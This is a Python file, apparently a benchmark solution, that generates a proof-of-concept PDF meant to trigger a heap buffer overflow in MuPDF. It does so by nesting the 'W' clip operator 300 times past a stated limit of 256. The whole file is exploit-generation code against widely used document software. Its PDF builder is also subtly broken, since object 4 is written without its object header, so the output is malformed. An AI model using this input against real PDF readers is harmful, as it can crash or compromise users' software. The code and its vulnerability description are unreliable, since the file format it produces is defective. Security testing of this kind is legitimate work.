import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap buffer overflow in MuPDF due to an unchecked
        # nesting depth for clipping paths. The function `pdf_push_clip`, called
        # by the 'W' operator in a PDF content stream, increments a clip depth
        # counter and writes to a graphics state array without verifying if it's
        # within bounds. The default limit for this array is 256. To trigger the
        # overflow, we repeat the 'W' operation more than 256 times.
        num_repetitions = 300
        
        # This block of PDF stream commands defines a 1x1 rectangle path ('re'),
        # sets it as a clip path ('W'), which triggers the bug, and then starts
        # a new path ('n') for the next iteration.
        repeating_block = b'0 0 1 1 re W n '
        
        content_stream = repeating_block * num_repetitions
        
        poc_pdf = self._build_pdf(content_stream)
        
        return poc_pdf

    def _build_pdf(self, content_stream: bytes) -> bytes:
        out = io.BytesIO()
        offsets = {}

        # PDF Header
        out.write(b"%PDF-1.7\n")
        out.write(b"%\xE2\xE3\xCF\xD3\n")

        # Object 1: Catalog
        offsets[1] = out.tell()
        out.write(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

        # Object 2: Pages Collection
        offsets[2] = out.tell()
        out.write(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")

        # Object 3: Page Object
        offsets[3] = out.tell()
        out.write(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] /Contents 4 0 R >>\nendobj\n")

        # Object 4: Content Stream
        offsets[4] = out.tell()
        out.write(f"<< /Length {len(content_stream)} >>\n".encode('latin-1'))
        out.write(b"stream\n")
        out.write(content_stream)
        out.write(b"\nendstream\nendobj\n")
        
        obj_count = 4

        # Cross-reference Table (xref)
        xref_pos = out.tell()
        out.write(b"xref\n")
        out.write(f"0 {obj_count + 1}\n".encode('latin-1'))
        out.write(b"0000000000 65535 f \n")
        for i in range(1, obj_count + 1):
            out.write(f"{offsets[i]:010d} 00000 n \n".encode('latin-1'))

        # PDF Trailer
        out.write(b"trailer\n")
        out.write(f"<< /Size {obj_count + 1} /Root 1 0 R >>\n".encode('latin-1'))
        out.write(b"startxref\n")
        out.write(f"{xref_pos}\n".encode('latin-1'))
        out.write(b"%%EOF\n")

        return out.getvalue()
